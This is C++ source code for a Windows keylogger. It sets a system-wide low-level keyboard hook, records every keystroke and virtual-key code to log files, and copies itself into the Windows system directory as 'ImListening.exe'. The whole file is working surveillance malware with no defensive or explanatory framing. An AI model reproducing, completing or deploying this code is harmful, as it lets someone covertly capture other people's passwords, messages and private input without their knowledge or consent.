#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

string getExePath(void);

HHOOK hKeyHook;
KBDLLHOOKSTRUCT kbdStruct;

BYTE keyState[256];
WCHAR buffer[16];

char systemPath[MAX_PATH];
char pathtofile[MAX_PATH];
HMODULE GetModH = GetModuleHandle(NULL);
 
LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{

    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        FILE *LOG;
        FILE *VKLOG;
              
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        
        LOG = fopen("keys.log", "a");
        VKLOG = fopen("vk_keys.log", "a");
        
        switch((unsigned int)kbdStruct.vkCode){
              case 0xA1:
                   fprintf(LOG,"[right shift down]");
              break;
              
              case 0xA0:
                    fprintf(LOG,"[shift down]");
              break;   
              
              case 0x8:
                    fprintf(LOG, "[backspace]");
              break;  
              
              case 0xD:
                    fprintf(LOG, "\n");
              break;
              
              case 0x1B:
                    fprintf(LOG,"[esc]");
              break;            
              
              case 0x9:
                    fprintf(LOG,"[tab]");
              break;
              
              case 0x2E:
                    fprintf(LOG,"[delete]");
              break;
              
              case 0xA4:
                    fprintf(LOG,"[alt]");
              break;
              
              case 0x25:
                   fprintf(LOG,"[left]");
              break;
              
              case 0x26:
                   fprintf(LOG,"[up]");
              break;
              
              case 0x27:
                   fprintf(LOG,"[right]");
              break;
              
              case 0x28:
                   fprintf(LOG,"[down]");
              break;
              
              case 0xA2:
              case 0xA3:
                    fprintf(LOG,"[ctrl]");
              break;
              
              default:
                      GetKeyboardState((PBYTE)&keyState);
                      ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer) / 2, 0);
                      fprintf(LOG, "%c",buffer[0]);
              break;
        }
        
        fprintf(VKLOG, "%X\n", kbdStruct.vkCode);
        
        fclose(VKLOG);
        fclose(LOG);
        
    }
    
    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
    {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); 
             
            FILE *LOG;
            LOG = fopen("keys.log", "a");
            
            switch((unsigned int)kbdStruct.vkCode){
                             
              case 0xA1:
                   fprintf(LOG,"[right shift up]");
              break;
              
              case 0xA0:
                    fprintf(LOG,"[left shift up]");
              break;
            }
            fclose(LOG);  
    }
    
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}
 
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow)
{
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
     
    MSG message;
    
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(systemPath,sizeof(systemPath));
    
    const char *exePath = getExePath().c_str();
    
    cout << "checking" << endl;
    
    cout << systemPath << " ---- " << exePath << endl;
    
    if (strcmp(systemPath, exePath)!= 0){
          strcat(systemPath,"\\ImListening.exe");
          CopyFile(pathtofile,systemPath,false);  
          cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
    }
    
    while(GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
     
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}

string getExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    return string( buffer ).substr( 0, pos);
}

